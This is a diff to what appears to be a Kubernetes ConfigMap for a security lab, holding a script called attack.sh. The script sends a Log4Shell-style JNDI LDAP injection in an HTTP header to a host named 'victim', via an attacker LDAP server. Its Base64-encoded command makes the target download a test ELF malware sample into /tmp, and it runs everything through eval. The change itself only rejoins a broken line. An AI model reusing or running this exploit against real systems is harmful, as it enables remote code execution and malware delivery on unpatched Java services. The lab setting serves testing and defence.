@@ -6,8 +6,7 @@ apiVersion: v1
 data:
   attack.sh: |+
     #!/bin/bash
-    ATTACK_URL='X-Api-Version: ${jndi:ldap://att-svr:1389/Basic/Command/Base64/d2dldCBodHRwOi8vd2lsZGZpcmUucGFsb2FsdG9uZXR3b3Jrcy5jb20vcHVibGljYXBpL3R
-lc3QvZWxmIC1PIC90bXAvbWFsd2FyZS1zYW1wbGUK}'
+    ATTACK_URL='X-Api-Version: ${jndi:ldap://att-svr:1389/Basic/Command/Base64/d2dldCBodHRwOi8vd2lsZGZpcmUucGFsb2FsdG9uZXR3b3Jrcy5jb20vcHVibGljYXBpL3Rlc3QvZWxmIC1PIC90bXAvbWFsd2FyZS1zYW1wbGUK}'
     ATTACK_COMMAND="curl victim:8080 -H '${ATTACK_URL}'"
     eval "$ATTACK_COMMAND"
 
